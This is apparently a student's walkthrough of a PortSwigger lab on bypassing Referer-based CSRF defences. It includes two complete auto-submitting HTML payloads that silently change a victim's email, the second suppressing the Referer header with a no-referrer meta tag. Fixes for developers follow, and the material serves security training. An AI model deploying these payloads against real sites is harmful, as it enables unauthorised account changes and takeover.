**Quick Brief:**
- CSRF exploits the browser's automatic credential sending mechanism combined with the application's trust in authenticated requests without verification of user intent
- The vulnerability exists because web applications cannot distinguish between:
      1. A legitimate request initiated by the user through the application's UI
      2. A forged request initiated by an attacker from another site

- The Referer header (properly spelled Referrer) is an HTTP request header that tells a server exactly where a request came from


- Most developers implement this check to block requests coming from attacker-site.com. However, 
if the attacker can force the browser to strip the Referer header, 
the server's validation logic looks like this:


**What we're testing:** The `/my-account/change-email` endpoint for CSRF protection
**Why it might be vulnerable:** No CSRF token, SameSite cookies, or other anti-CSRF measures
**What CSRF exploits:** Browser automatically sends session cookies with requests


**URL:** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
## Steps:
1. Open your lab and log in with given credentials wiener:peter
2. Open Burp Suite we know from the lab describtion the endpoint of the email is vulnerable to csrf
3. Change your email and send the request to repeater
4. Observe from the request there is no csrf key or csrf cookie 
7. Now we will prepare our malicious code

12.
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <iframe style="display: none;" id="csrf-iframe"></iframe>
    <form action="https://0a3d00e8048667fe806a1231004e009e.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
        <input type="hidden" name="email" value="test.test@ca">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```


13. Copy the code and change the lab link to your lab link and paste it in the body of the exploit server and then store the exploit then Deliver exploit to victim
14. Notice we didn't get lab solved meaning there is a problem click on view exploit notice a message invalid referer header meeaning the website rely on the referrer header
15. To make the lab not send the referer header we can Tell the browser to not send the referer header

```

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <title>Document</title>
</head>
<body>
    <iframe style="display: none;" id="csrf-iframe"></iframe>
    <form action="https://0a3d00e8048667fe806a1231004e009e.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
        <input type="hidden" name="email" value="test.test@ca">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>

```
14. Lab solved

## Notes:
- This code is like a normal html page that change the users email automatically without even them knowing by just making the user click on the link
- The  `<form> </form>` is to create a form in html :
`action` here we put our lab link id and the functionality `/my-account/change-email` you want to excute

- The `<input>` is to create an input for the email in the html form:
`type:hidden` so the no input field appear to the user
`name:email` we got it from the rquest
`value` is the new email you want to change to

- The `<iframe></iframe>` is a sand box so the form is excuted inside it :
`style="display: none;` so nothing appear to the user

- <meta name="referrer" content="no-referrer"> This tells the browser to not send the referer header





-To prevent this, browsers and developers use a Referrer-Policy to control how much data is shared:
| Policy | What it sends |
| :--- | :--- |
| `no-referrer` | Nothing. The header is omitted. |
| `origin` | Just the domain (e.g., `https://blog.com/`). |
| `strict-origin-when-cross-origin` | Full URL for same-site, only domain for cross-site (Modern Default). |
| `unsafe-url` | The full URL, including query parameters (Dangerous). |




## How to Fix (For Developers)
1. **CSRF Tokens**: Validate tokens on both request methods or allow only post requests
2. **SameSite Cookies**: `SameSite=Strict` for sensitive actions
3. **Custom Headers**: Require `X-Requested-With: XMLHttpRequest`
4. **Double Submit**: Token in both cookie and request





